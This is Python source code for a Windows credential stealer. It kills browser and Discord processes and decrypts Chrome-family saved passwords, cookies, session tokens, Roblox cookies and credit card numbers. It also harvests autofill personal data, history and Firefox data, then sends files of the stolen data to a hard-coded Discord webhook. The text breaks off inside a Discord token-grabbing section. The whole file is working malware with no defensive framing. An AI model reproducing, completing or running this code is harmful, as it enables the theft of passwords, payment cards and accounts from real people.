import os
import json
import sqlite3
import shutil
from pathlib import Path
import time
import subprocess
import base64
import requests
from Crypto.Cipher import AES
import win32crypt
import re
import zipfile
import datetime
import urllib.request
import urllib.parse

WEBHOOK_URL = 'https://discord.com/api/webhooks/1456777159485030622/jCht14DtaT2nThpS2ox-b2a-kyMb-VwtyPrCoboeu6RjTlUAPQGUBhnOX0g-4dzH-91p'

def send_file_to_discord(filename, content):
    try:
        files = {'file': (filename, content)}
        requests.post(WEBHOOK_URL, files=files)
        return True
    except:
        return False

def send_embed_to_discord(embed_data):
    try:
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
        }
        requests.post(WEBHOOK_URL, json=embed_data, headers=headers)
        return True
    except:
        return False

def getheaders(token=None):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
    }
    if token:
        headers.update({"Authorization": token})
    return headers

def getip():
    try:
        with urllib.request.urlopen("https://api.ipify.org?format=json") as response:
            return json.loads(response.read().decode()).get("ip")
    except:
        return "None"

def kill_browser_processes():
    processes = [
        "opera.exe", "operagx.exe", "chrome.exe", "msedge.exe", "brave.exe", 
        "firefox.exe", "amigo.exe", "torch.exe", "kometa.exe", "orbitum.exe",
        "centbrowser.exe", "7star.exe", "sputnik.exe", "vivaldi.exe", "epic.exe",
        "uran.exe", "yandex.exe", "iridium.exe", "discord.exe", "discordcanary.exe",
        "discordptb.exe"
    ]
    for process in processes:
        try:
            subprocess.run(f'taskkill /F /IM "{process}" /T', shell=True, capture_output=True, timeout=1)
        except:
            pass
    time.sleep(1)

def get_chrome_master_key(browser_path):
    local_state_path = browser_path / 'Local State'
    try:
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
        encrypted_key = encrypted_key[5:]
        master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return master_key
    except:
        return None

def decrypt_chrome_value(encrypted_value, master_key):
    try:
        if not encrypted_value:
            return None
        if isinstance(encrypted_value, str):
            encrypted_value = encrypted_value.encode('latin-1')
        if encrypted_value.startswith(b'v10'):
            encrypted_value = encrypted_value[3:]
            if len(encrypted_value) < 28:
                return None
            nonce = encrypted_value[:12]
            ciphertext = encrypted_value[12:-16]
            tag = encrypted_value[-16:]
            cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
            decrypted = cipher.decrypt_and_verify(ciphertext, tag)
            return decrypted.decode('utf-8', errors='ignore')
        else:
            decrypted = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)
            return decrypted[1].decode('utf-8', errors='ignore') if decrypted and decrypted[1] else None
    except:
        return None

def extract_all_chrome_data(browser_name, browser_path):
    results = {
        'tokens': [],
        'passwords': [],
        'autofill': [],
        'autofill_profiles': [],  # NEW: Full autofill profiles
        'autofill_credit_cards': [],  # NEW: Credit card autofill
        'all_cookies': [],
        'roblox_cookies': [],
        'leveldb': [],
        'sessions': [],
        'history': [],
        'downloads': [],
        'credit_cards': []
    }
    
    master_key = get_chrome_master_key(browser_path)
    
    # Check multiple profile paths
    profile_paths = ['Default', 'Profile 1', 'Profile 2', 'Profile 3']
    
    for profile in profile_paths:
        profile_dir = browser_path / profile
        
        # Extract cookies from each profile
        cookies_path = profile_dir / 'Network' / 'Cookies'
        alt_cookies_path = profile_dir / 'Cookies'
        
        for path in [cookies_path, alt_cookies_path]:
            if path.exists() and master_key:
                try:
                    temp_db = Path(os.environ['TEMP']) / f'{browser_name}_{profile}_cookies.db'
                    shutil.copy2(path, temp_db)
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    cursor.execute("SELECT host_key, name, encrypted_value, expires_utc, is_secure, is_httponly FROM cookies")
                    
                    for host_key, name, encrypted_value, expires_utc, is_secure, is_httponly in cursor.fetchall():
                        if encrypted_value:
                            decrypted = decrypt_chrome_value(encrypted_value, master_key)
                            if decrypted and decrypted.strip():
                                cookie_data = {
                                    'host': host_key,
                                    'name': name,
                                    'value': decrypted,
                                    'expires': expires_utc,
                                    'secure': bool(is_secure),
                                    'httponly': bool(is_httponly),
                                    'profile': profile
                                }
                                
                                results['all_cookies'].append(cookie_data)
                                
                                if name == '.ROBLOSECURITY' and 'roblox' in host_key.lower():
                                    results['roblox_cookies'].append(cookie_data)
                                
                                name_lower = name.lower()
                                if any(token in name_lower for token in ['access_token', 'refresh_token', 'sessionid', 'csrftoken', 'token', 'auth', 'session', 'csrf']):
                                    results['tokens'].append(cookie_data)
                    
                    cursor.close()
                    conn.close()
                    os.remove(temp_db)
                except:
                    pass
    
    # Extract passwords from each profile
    for profile in profile_paths:
        profile_dir = browser_path / profile
        logins_path = profile_dir / 'Login Data'
        
        if logins_path.exists() and master_key:
            try:
                # Remove journal file if exists
                journal_path = profile_dir / 'Login Data-journal'
                if journal_path.exists():
                    try:
                        os.remove(journal_path)
                    except:
                        pass
                
                temp_db = Path(os.environ['TEMP']) / f'{browser_name}_{profile}_logins.db'
                shutil.copy2(logins_path, temp_db)
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                
                for url, username, encrypted_password in cursor.fetchall():
                    if encrypted_password:
                        decrypted = decrypt_chrome_value(encrypted_password, master_key)
                        if decrypted:
                            results['passwords'].append({
                                'url': url,
                                'username': username,
                                'password': decrypted,
                                'profile': profile
                            })
                
                cursor.close()
                conn.close()
                os.remove(temp_db)
            except:
                pass
    
    # =============== ENHANCED AUTOFILL EXTRACTION ===============
    for profile in profile_paths:
        profile_dir = browser_path / profile
        webdata_path = profile_dir / 'Web Data'
        
        if webdata_path.exists():
            try:
                temp_db = Path(os.environ['TEMP']) / f'{browser_name}_{profile}_webdata.db'
                shutil.copy2(webdata_path, temp_db)
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                
                # 1. Extract ALL regular autofill entries
                cursor.execute("SELECT name, value FROM autofill WHERE value IS NOT NULL AND value != ''")
                for name, value in cursor.fetchall():
                    if value and isinstance(value, str) and value.strip():
                        results['autofill'].append({
                            'field': name,
                            'value': value,
                            'profile': profile,
                            'type': 'regular_autofill'
                        })
                
                # 2. Extract ALL autofill profiles (addresses, personal info)
                try:
                    cursor.execute("""
                        SELECT guid, company_name, street_address, address_1, address_2, address_3, 
                               city, state, zipcode, country_code, country, full_name, 
                               first_name, middle_name, last_name, email, phone
                        FROM autofill_profiles
                    """)
                    
                    profile_columns = ['guid', 'company_name', 'street_address', 'address_1', 'address_2', 'address_3',
                                     'city', 'state', 'zipcode', 'country_code', 'country', 'full_name',
                                     'first_name', 'middle_name', 'last_name', 'email', 'phone']
                    
                    for row in cursor.fetchall():
                        profile_data = {'profile': profile, 'type': 'autofill_profile'}
                        for i, col_name in enumerate(profile_columns):
                            if i < len(row) and row[i]:
                                profile_data[col_name] = row[i]
                        
                        results['autofill_profiles'].append(profile_data)
                        
                        # Also add individual fields to regular autofill for easy viewing
                        for field_name in ['company_name', 'street_address', 'city', 'state', 'zipcode', 
                                         'country_code', 'country', 'full_name', 'first_name', 'middle_name',
                                         'last_name', 'email', 'phone']:
                            if field_name in profile_data and profile_data[field_name]:
                                results['autofill'].append({
                                    'field': f'profile_{field_name}',
                                    'value': profile_data[field_name],
                                    'profile': profile,
                                    'type': 'profile_field',
                                    'guid': profile_data.get('guid', '')
                                })
                except:
                    pass
                
                # 3. Extract ALL autofill profile names (additional names table)
                try:
                    cursor.execute("SELECT first_name, middle_name, last_name FROM autofill_profile_names")
                    for first, middle, last in cursor.fetchall():
                        name_data = {}
                        if first:
                            name_data['first_name'] = first
                        if middle:
                            name_data['middle_name'] = middle
                        if last:
                            name_data['last_name'] = last
                        
                        if name_data:
                            results['autofill_profiles'].append({
                                **name_data,
                                'profile': profile,
                                'type': 'profile_name'
                            })
                except:
                    pass
                
                # 4. Extract ALL autofill profile emails
                try:
                    cursor.execute("SELECT email FROM autofill_profile_emails")
                    for (email,) in cursor.fetchall():
                        if email:
                            results['autofill_profiles'].append({
                                'email': email,
                                'profile': profile,
                                'type': 'profile_email'
                            })
                            results['autofill'].append({
                                'field': 'profile_email',
                                'value': email,
                                'profile': profile,
                                'type': 'profile_field'
                            })
                except:
                    pass
                
                # 5. Extract ALL autofill profile phones
                try:
                    cursor.execute("SELECT number FROM autofill_profile_phones")
                    for (number,) in cursor.fetchall():
                        if number:
                            results['autofill_profiles'].append({
                                'phone': number,
                                'profile': profile,
                                'type': 'profile_phone'
                            })
                            results['autofill'].append({
                                'field': 'profile_phone',
                                'value': number,
                                'profile': profile,
                                'type': 'profile_field'
                            })
                except:
                    pass
                
                # 6. Extract autofill usernames (from separate table)
                try:
                    cursor.execute("SELECT username FROM autofill_usernames")
                    for (username,) in cursor.fetchall():
                        if username:
                            results['autofill'].append({
                                'field': 'saved_username',
                                'value': username,
                                'profile': profile,
                                'type': 'username'
                            })
                except:
                    pass
                
                # 7. Extract autofill passwords from autofill table (if any)
                try:
                    cursor.execute("SELECT name, value FROM autofill WHERE LOWER(name) LIKE '%password%' OR LOWER(name) LIKE '%pass%' OR LOWER(name) LIKE '%pwd%'")
                    for name, value in cursor.fetchall():
                        if value and isinstance(value, str) and value.strip():
                            results['autofill'].append({
                                'field': name,
                                'value': value,
                                'profile': profile,
                                'type': 'password_field'
                            })
                except:
                    pass
                
                cursor.close()
                conn.close()
                os.remove(temp_db)
            except Exception as e:
                print(f"Error extracting autofill from {profile}: {e}")
                pass
    
    # Extract credit cards with ALL DETAILS
    for profile in profile_paths:
        profile_dir = browser_path / profile
        webdata_path = profile_dir / 'Web Data'
        
        if webdata_path.exists() and master_key:
            try:
                temp_db = Path(os.environ['TEMP']) / f'{browser_name}_{profile}_webdata.db'
                shutil.copy2(webdata_path, temp_db)
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                
                # Get all available columns in credit_cards table
                cursor.execute("PRAGMA table_info(credit_cards)")
                columns = [col[1] for col in cursor.fetchall()]
                
                # Build query with all available columns
                columns_str = ', '.join(columns)
                cursor.execute(f"SELECT {columns_str} FROM credit_cards")
                
                column_names = ['id', 'guid', 'name_on_card', 'expiration_month', 'expiration_year',
                              'card_number_encrypted', 'date_modified', 'origin', 'use_count',
                              'use_date', 'billing_address_id', 'nickname']
                
                for row in cursor.fetchall():
                    card_data = {'profile': profile}
                    
                    for i, col_name in enumerate(column_names):
                        if i < len(row) and row[i] is not None:
                            card_data[col_name] = row[i]
                    
                    # Decrypt card number if encrypted
                    if 'card_number_encrypted' in card_data and card_data['card_number_encrypted'] and master_key:
                        decrypted = decrypt_chrome_value(card_data['card_number_encrypted'], master_key)
                        if decrypted:
                            card_data['card_number'] = decrypted
                            card_data['type'] = 'credit_card'
                            
                            # Add to credit cards list
                            results['credit_cards'].append(card_data)
                            
                            # Also add to autofill_credit_cards for detailed view
                            results['autofill_credit_cards'].append(card_data)
                    
                    # Also add billing address if available
                    if 'billing_address_id' in card_data and card_data['billing_address_id']:
                        # Try to get billing address details
                        try:
                            cursor.execute(f"SELECT * FROM autofill_profiles WHERE guid = ?", (card_data['billing_address_id'],))
                            billing_address = cursor.fetchone()
                            if billing_address:
                                address_cols = ['guid', 'company_name', 'street_address', 'city', 'state', 
                                              'zipcode', 'country_code', 'phone']
                                for i, col_name in enumerate(address_cols):
                                    if i < len(billing_address) and billing_address[i]:
                                        card_data[f'billing_{col_name}'] = billing_address[i]
                        except:
                            pass
                
                cursor.close()
                conn.close()
                os.remove(temp_db)
            except:
                pass
    
    # Extract LevelDB data from each profile
    for profile in profile_paths:
        profile_dir = browser_path / profile
        leveldb_path = profile_dir / 'Local Storage' / 'leveldb'
        
        if leveldb_path.exists():
            for file in leveldb_path.iterdir():
                if file.is_file() and file.suffix in ['.ldb', '.log']:
                    try:
                        with open(file, 'rb') as f:
                            content = f.read(100000)
                        text = content.decode('utf-8', errors='ignore')
                        
                        if text.strip():
                            results['leveldb'].append({
                                'file': file.name,
                                'preview': text[:5000] if len(text) > 5000 else text,
                                'profile': profile
                            })
                    except:
                        continue
    
    # Extract session data from each profile
    for profile in profile_paths:
        profile_dir = browser_path / profile
        sessions_path = profile_dir / 'Sessions'
        
        if sessions_path.exists():
            for file in sessions_path.iterdir():
                if file.is_file():
                    try:
                        with open(file, 'rb') as f:
                            content = f.read(50000)
                        text = content.decode('utf-8', errors='ignore')
                        
                        urls = re.findall(r'https?://[^\s<>"\'{}|\\^`\[\]]+', text)
                        if urls:
                            results['sessions'].append({
                                'file': file.name,
                                'urls': urls,
                                'profile': profile
                            })
                    except:
                        continue
    
    # Extract history from each profile
    for profile in profile_paths:
        profile_dir = browser_path / profile
        history_path = profile_dir / 'History'
        
        if history_path.exists():
            try:
                temp_db = Path(os.environ['TEMP']) / f'{browser_name}_{profile}_history.db'
                shutil.copy2(history_path, temp_db)
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                
                cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC")
                for url, title, visit_count, last_visit_time in cursor.fetchall():
                    results['history'].append({
                        'url': url,
                        'title': title,
                        'visits': visit_count,
                        'last_visit': last_visit_time,
                        'profile': profile
                    })
                
                cursor.close()
                conn.close()
                os.remove(temp_db)
            except:
                pass
    
    # Extract downloads from each profile
    for profile in profile_paths:
        profile_dir = browser_path / profile
        history_path = profile_dir / 'History'
        
        if history_path.exists():
            try:
                temp_db = Path(os.environ['TEMP']) / f'{browser_name}_{profile}_history.db'
                shutil.copy2(history_path, temp_db)
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                
                cursor.execute("SELECT target_path, tab_url, start_time, received_bytes FROM downloads ORDER BY start_time DESC")
                for target_path, tab_url, start_time, received_bytes in cursor.fetchall():
                    results['downloads'].append({
                        'file': target_path,
                        'from_url': tab_url,
                        'time': start_time,
                        'size': received_bytes,
                        'profile': profile
                    })
                
                cursor.close()
                conn.close()
                os.remove(temp_db)
            except:
                pass
    
    return results

def extract_all_firefox_data(profile_name, profile_path):
    results = {
        'tokens': [],
        'passwords': [],
        'autofill': [],
        'autofill_profiles': [],  # NEW for Firefox
        'autofill_credit_cards': [],  # NEW for Firefox
        'all_cookies': [],
        'roblox_cookies': [],
        'leveldb': [],
        'sessions': [],
        'history': [],
        'downloads': [],
        'credit_cards': []
    }
    
    # Extract Firefox passwords
    try:
        logins_path = profile_path / 'logins.json'
        if logins_path.exists():
            with open(logins_path, 'r', encoding='utf-8') as f:
                data = json.load(f)
            for login in data.get('logins', []):
                if 'hostname' in login and 'encryptedUsername' in login and 'encryptedPassword' in login:
                    results['passwords'].append({
                        'url': login['hostname'],
                        'username': login['encryptedUsername'],
                        'password': login['encryptedPassword']
                    })
    except:
        pass
    
    # Extract ALL Firefox cookies - NO LIMITS
    try:
        cookies_path = profile_path / 'cookies.sqlite'
        if cookies_path.exists():
            temp_db = Path(os.environ['TEMP']) / 'firefox_cookies.db'
            shutil.copy2(cookies_path, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT host, name, value, path, expiry, isSecure, isHttpOnly FROM moz_cookies")
            
            for host, name, value, path, expiry, isSecure, isHttpOnly in cursor.fetchall():
                cookie_data = {
                    'host': host,
                    'name': name,
                    'value': value,
                    'path': path,
                    'expires': expiry,
                    'secure': bool(isSecure),
                    'httponly': bool(isHttpOnly)
                }
                
                results['all_cookies'].append(cookie_data)
                
                if name == '.ROBLOSECURITY' and 'roblox' in host.lower():
                    results['roblox_cookies'].append(cookie_data)
                
                name_lower = name.lower()
                if any(token in name_lower for token in ['access_token', 'refresh_token', 'sessionid', 'csrftoken', 'token', 'auth', 'session', 'csrf']):
                    results['tokens'].append(cookie_data)
            
            cursor.close()
            conn.close()
            os.remove(temp_db)
    except:
        pass
    
    # Extract ALL Firefox autofill - ENHANCED
    try:
        # 1. Form history (regular autofill)
        formhistory_path = profile_path / 'formhistory.sqlite'
        if formhistory_path.exists():
            temp_db = Path(os.environ['TEMP']) / 'firefox_formhistory.db'
            shutil.copy2(formhistory_path, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT fieldname, value, timesUsed, firstUsed, lastUsed FROM moz_formhistory")
            
            for fieldname, value, timesUsed, firstUsed, lastUsed in cursor.fetchall():
                if value and isinstance(value, str) and value.strip():
                    autofill_entry = {
                        'field': fieldname,
                        'value': value,
                        'type': 'form_history',
                        'times_used': timesUsed,
                        'first_used': firstUsed,
                        'last_used': lastUsed
                    }
                    
                    # Check for password fields
                    fieldname_lower = fieldname.lower()
                    if any(pwd_keyword in fieldname_lower for pwd_keyword in ['password', 'pass', 'pwd']):
                        autofill_entry['type'] = 'password_field'
                    
                    # Check for username fields
                    elif any(user_keyword in fieldname_lower for user_keyword in ['username', 'user', 'login', 'email']):
                        autofill_entry['type'] = 'username_field'
                    
                    results['autofill'].append(autofill_entry)
            
            cursor.close()
            conn.close()
            os.remove(temp_db)
        
        # 2. Addresses from autofill
        try:
            # Firefox stores addresses in form history with specific field names
            # We'll look for common address field patterns
            if formhistory_path.exists():
                temp_db = Path(os.environ['TEMP']) / 'firefox_formhistory_addr.db'
                shutil.copy2(formhistory_path, temp_db)
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                
                # Look for address-related fields
                address_fields = ['address', 'street', 'city', 'state', 'zip', 'postal', 'country', 
                                'phone', 'tel', 'mobile', 'company', 'name', 'firstname', 'lastname']
                
                for field in address_fields:
                    cursor.execute("SELECT fieldname, value FROM moz_formhistory WHERE LOWER(fieldname) LIKE ?", (f'%{field}%',))
                    for fieldname, value in cursor.fetchall():
                        if value:
                            results['autofill_profiles'].append({
                                'field': fieldname,
                                'value': value,
                                'type': 'address_field'
                            })
                
                cursor.close()
                conn.close()
                os.remove(temp_db)
        except:
            pass
        
    except:
        pass
    
    # Extract Firefox history
    try:
        places_path = profile_path / 'places.sqlite'
        if places_path.exists():
            temp_db = Path(os.environ['TEMP']) / 'firefox_places.db'
            shutil.copy2(places_path, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            cursor.execute("SELECT url, title, visit_count, last_visit_date FROM moz_places ORDER BY last_visit_date DESC")
            for url, title, visit_count, last_visit_date in cursor.fetchall():
                results['history'].append({
                    'url': url,
                    'title': title,
                    'visits': visit_count,
                    'last_visit': last_visit_date
                })
            
            cursor.close()
            conn.close()
            os.remove(temp_db)
    except:
        pass
    
    # Extract Firefox downloads
    try:
        if places_path.exists():
            temp_db = Path(os.environ['TEMP']) / 'firefox_places.db'
            shutil.copy2(places_path, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            cursor.execute("SELECT content, place_id, dateAdded FROM moz_annos WHERE anno_attribute_id = 1")
            for content, place_id, dateAdded in cursor.fetchall():
                results['downloads'].append({
                    'file': content,
                    'time': dateAdded
                })
            
            cursor.close()
            conn.close()
            os.remove(temp_db)
    except:
        pass
    
    return results

def create_data_files(browser_name, data):
    timestamp = int(time.time())
    files_content = {}
    
    # 1. Tokens file
    if data['tokens']:
        content = f"=== {browser_name} - ALL TOKENS ({len(data['tokens'])}) ===\n\n"
        for i, token in enumerate(data['tokens']):
            content += f"[TOKEN {i+1}]\n"
            content += f"Type: {token['name']}\n"
            content += f"Host: {token['host']}\n"
            if 'profile' in token:
                content += f"Profile: {token['profile']}\n"
            content += f"Value: {token['value']}\n"
            if 'expires' in token:
                content += f"Expires: {token['expires']}\n"
            if 'secure' in token:
                content += f"Secure: {token['secure']}\n"
            content += "-" * 50 + "\n\n"
        files_content[f'{browser_name}_tokens_{timestamp}.txt'] = content
    
    # 2. Passwords file
    if data['passwords']:
        content = f"=== {browser_name} - ALL PASSWORDS ({len(data['passwords'])}) ===\n\n"
        for i, pwd in enumerate(data['passwords']):
            content += f"[PASSWORD {i+1}]\n"
            content += f"URL: {pwd.get('url', 'N/A')}\n"
            content += f"Username: {pwd.get('username', 'N/A')}\n"
            content += f"Password: {pwd.get('password', 'N/A')}\n"
            if 'profile' in pwd:
                content += f"Profile: {pwd['profile']}\n"
            content += "-" * 50 + "\n\n"
        files_content[f'{browser_name}_passwords_{timestamp}.txt'] = content
    
    # 3. Roblox cookies file
    if data['roblox_cookies']:
        content = f"=== {browser_name} - ROBLOX COOKIES ({len(data['roblox_cookies'])}) ===\n\n"
        for i, cookie in enumerate(data['roblox_cookies']):
            content += f"[ROBLOX COOKIE {i+1}]\n"
            content += f"Host: {cookie['host']}\n"
            if 'profile' in cookie:
                content += f"Profile: {cookie['profile']}\n"
            content += f"Full Cookie Value:\n{cookie['value']}\n"
            content += "=" * 60 + "\n\n"
        files_content[f'{browser_name}_roblox_{timestamp}.txt'] = content
    
    # 4. COMPLETE AUTOFILL DATA FILE (ALL TYPES)
    autofill_entries = []
    autofill_entries.extend(data['autofill'])
    
    if autofill_entries:
        content = f"=== {browser_name} - COMPLETE AUTOFILL DATA ({len(autofill_entries)}) ===\n\n"
        
        # Group by type
        by_type = {}
        for entry in autofill_entries:
            entry_type = entry.get('type', 'unknown')
            if entry_type not in by_type:
                by_type[entry_type] = []
            by_type[entry_type].append(entry)
        
        for entry_type, entries in by_type.items():
            content += f"\n\n{'='*60}\n{entry_type.upper()} ({len(entries)} entries)\n{'='*60}\n\n"
            
            for i, item in enumerate(entries):
                content += f"[{entry_type.upper()} {i+1}]\n"
                content += f"Field: {item.get('field', 'N/A')}\n"
                if 'profile' in item:
                    content += f"Profile: {item['profile']}\n"
                if 'guid' in item:
                    content += f"GUID: {item['guid']}\n"
                content += f"Value: {item.get('value', 'N/A')}\n"
                content += "-" * 40 + "\n\n"
        
        files_content[f'{browser_name}_autofill_complete_{timestamp}.txt'] = content
    
    # 5. AUTOFILL PROFILES FILE (Addresses, Personal Info)
    if data['autofill_profiles']:
        content = f"=== {browser_name} - AUTOFILL PROFILES ({len(data['autofill_profiles'])}) ===\n\n"
        content += "FULL ADDRESSES & PERSONAL INFORMATION:\n"
        content += "=" * 80 + "\n\n"
        
        for i, profile in enumerate(data['autofill_profiles']):
            content += f"[PROFILE {i+1}]\n"
            content += f"Type: {profile.get('type', 'N/A')}\n"
            if 'profile' in profile:
                content += f"Browser Profile: {profile['profile']}\n"
            
            # Display all available fields
            fields_to_display = ['full_name', 'first_name', 'middle_name', 'last_name', 
                               'company_name', 'street_address', 'address_1', 'address_2', 'address_3',
                               'city', 'state', 'zipcode', 'country_code', 'country',
                               'email', 'phone', 'field', 'value']
            
            for field in fields_to_display:
                if field in profile and profile[field]:
                    content += f"{field.replace('_', ' ').title()}: {profile[field]}\n"
            
            content += "-" * 60 + "\n\n"
        
        files_content[f'{browser_name}_autofill_profiles_{timestamp}.txt'] = content
    
    # 6. CREDIT CARDS DETAILED FILE
    if data['autofill_credit_cards'] or data['credit_cards']:
        all_cards = data['autofill_credit_cards'] + data['credit_cards']
        content = f"=== {browser_name} - CREDIT CARDS ({len(all_cards)}) ===\n\n"
        content += "FULL CREDIT CARD INFORMATION:\n"
        content += "=" * 80 + "\n\n"
        
        for i, card in enumerate(all_cards):
            content += f"[CARD {i+1}]\n"
            if 'profile' in card:
                content += f"Profile: {card['profile']}\n"
            
            # Card details
            if 'name_on_card' in card:
                content += f"Name: {card['name_on_card']}\n"
            if 'card_number' in card:
                content += f"Number: {card['card_number']}\n"
            if 'expiration_month' in card and 'expiration_year' in card:
                content += f"Expiry: {card['expiration_month']}/{card['expiration_year']}\n"
            if 'nickname' in card:
                content += f"Nickname: {card['nickname']}\n"
            if 'use_count' in card:
                content += f"Times Used: {card['use_count']}\n"
            if 'use_date' in card:
                content += f"Last Used: {card['use_date']}\n"
            
            # Billing address
            billing_fields = ['billing_company_name', 'billing_street_address', 'billing_city',
                            'billing_state', 'billing_zipcode', 'billing_country_code', 'billing_phone']
            
            has_billing = False
            for field in billing_fields:
                if field in card and card[field]:
                    if not has_billing:
                        content += "\nBilling Address:\n"
                        has_billing = True
                    content += f"  {field.replace('billing_', '').replace('_', ' ').title()}: {card[field]}\n"
            
            content += "-" * 60 + "\n\n"
        
        files_content[f'{browser_name}_credit_cards_detailed_{timestamp}.txt'] = content
    
    # 7. All cookies file
    if data['all_cookies']:
        content = f"=== {browser_name} - ALL COOKIES ({len(data['all_cookies'])}) ===\n\n"
        for i, cookie in enumerate(data['all_cookies'][:2000]):
            content += f"[COOKIE {i+1}]\n"
            content += f"Host: {cookie['host']}\n"
            content += f"Name: {cookie['name']}\n"
            if 'profile' in cookie:
                content += f"Profile: {cookie['profile']}\n"
            content += f"Value: {cookie['value'][:200]}...\n" if len(cookie['value']) > 200 else f"Value: {cookie['value']}\n"
            content += "-" * 40 + "\n\n"
        files_content[f'{browser_name}_all_cookies_{timestamp}.txt'] = content
    
    # 8. History file
    if data['history']:
        content = f"=== {browser_name} - BROWSING HISTORY ({len(data['history'])}) ===\n\n"
        for i, visit in enumerate(data['history'][:500]):
            content += f"[VISIT {i+1}]\n"
            content += f"URL: {visit['url']}\n"
            content += f"Title: {visit.get('title', 'N/A')}\n"
            content += f"Visits: {visit.get('visits', 'N/A')}\n"
            if 'profile' in visit:
                content += f"Profile: {visit['profile']}\n"
            content += "-" * 40 + "\n\n"
        files_content[f'{browser_name}_history_{timestamp}.txt'] = content
    
    # 9. LevelDB data file
    if data['leveldb']:
        content = f"=== {browser_name} - LOCAL STORAGE DATA ({len(data['leveldb'])}) ===\n\n"
        for i, item in enumerate(data['leveldb']):
            content += f"[FILE {i+1}] {item['file']}\n"
            if 'profile' in item:
                content += f"Profile: {item['profile']}\n"
            content += f"Preview:\n{item['preview'][:1000]}...\n\n" if len(item['preview']) > 1000 else f"Content:\n{item['preview']}\n\n"
            content += "=" * 60 + "\n\n"
        files_content[f'{browser_name}_localstorage_{timestamp}.txt'] = content
    
    return files_content

def get_all_browsers():
    browsers = []
    appdata = Path(os.environ['APPDATA'])
    localappdata = Path(os.environ['LOCALAPPDATA'])
    
    # Chrome-based browsers (with ALL profiles)
    chrome_browsers = [
        ('Opera GX', appdata / 'Opera Software' / 'Opera GX Stable'),
        ('Opera', appdata / 'Opera Software' / 'Opera Stable'),
        ('Chrome', localappdata / 'Google' / 'Chrome' / 'User Data'),
        ('Edge', localappdata / 'Microsoft' / 'Edge' / 'User Data'),
        ('Brave', localappdata / 'BraveSoftware' / 'Brave-Browser' / 'User Data'),
        ('Amigo', localappdata / 'Amigo' / 'User Data'),
        ('Torch', localappdata / 'Torch' / 'User Data'),
        ('Kometa', localappdata / 'Kometa' / 'User Data'),
        ('Orbitum', localappdata / 'Orbitum' / 'User Data'),
        ('CentBrowser', localappdata / 'CentBrowser' / 'User Data'),
        ('7Star', localappdata / '7Star' / '7Star' / 'User Data'),
        ('Sputnik', localappdata / 'Sputnik' / 'Sputnik' / 'User Data'),
        ('Vivaldi', localappdata / 'Vivaldi' / 'User Data'),
        ('Chrome SxS', localappdata / 'Google' / 'Chrome SxS' / 'User Data'),
        ('Chrome Canary', localappdata / 'Google' / 'Chrome SxS' / 'User Data'),
        ('Epic Privacy Browser', localappdata / 'Epic Privacy Browser' / 'User Data'),
        ('Microsoft Edge Beta', localappdata / 'Microsoft' / 'Edge Beta' / 'User Data'),
        ('Microsoft Edge Dev', localappdata / 'Microsoft' / 'Edge Dev' / 'User Data'),
        ('Uran', localappdata / 'uCozMedia' / 'Uran' / 'User Data'),
        ('Yandex', localappdata / 'Yandex' / 'YandexBrowser' / 'User Data'),
        ('Iridium', localappdata / 'Iridium' / 'User Data'),
        ('Chromium', localappdata / 'Chromium' / 'User Data')
    ]
    
    for name, path in chrome_browsers:
        if path.exists():
            browsers.append(('chrome', name, path))
            # Also add individual profiles
            if path.exists():
                try:
                    for item in path.iterdir():
                        if item.is_dir() and (item.name.startswith('Profile') or item.name == 'Default'):
                            browsers.append(('chrome', f'{name}_{item.name}', item))
                except:
                    pass
    
    # Firefox
    firefox_path = appdata / 'Mozilla' / 'Firefox' / 'Profiles'
    if firefox_path.exists():
        for profile in firefox_path.iterdir():
            if profile.is_dir():
                browsers.append(('firefox', f'Firefox_{profile.name}', profile))
    
    return browsers

# =============== DISCORD TOKEN GRABBER FUNCTIONS FROM SECOND SCRIPT ===============
def gettokens_astraa(path):
    """Original gettokens function from second script"""
    path_str = str(path)
    path_str += "\\Local Storage\\leveldb\\"
    tokens = []

    if not os.path.exists(path_str):
        return tokens

    for file in os.listdir(path_str):
        if not file.endswith(".ldb") and not file.endswith(".log"):
            continue

        try:
            with open(os.path.join(path_str, file), "r", errors="ignore") as f:
                for line in (x.strip() for x in f.readlines()):
                    for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                        tokens.append(values)
        except PermissionError:
            continue

    return tokens
    
def getkey_astraa(path):
    """Original getkey function from second script"""
    path_str = str(path)
    with open(os.path.join(path_str, "Local State"), "r") as file:
        key = json.loads(file.read())['os_crypt']['encrypted_key']
        file.close()
    return key

def extract_discord_tokens_astraa():
    """Main Discord token extraction function from second script"""
    LOCAL = os.getenv("LOCALAPPDATA")
    ROAMING = os.getenv("APPDATA")
    
    PATHS = {
        'Discord': ROAMING + '\\discord',
        'Discord Canary': ROAMING + '\\discordcanary',
        'Lightcord': ROAMING + '\\Lightcord',
        'Discord PTB': ROAMING + '\\discordptb',
        'Opera': ROAMING + '\\Opera Software\\Opera Stable',
        'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
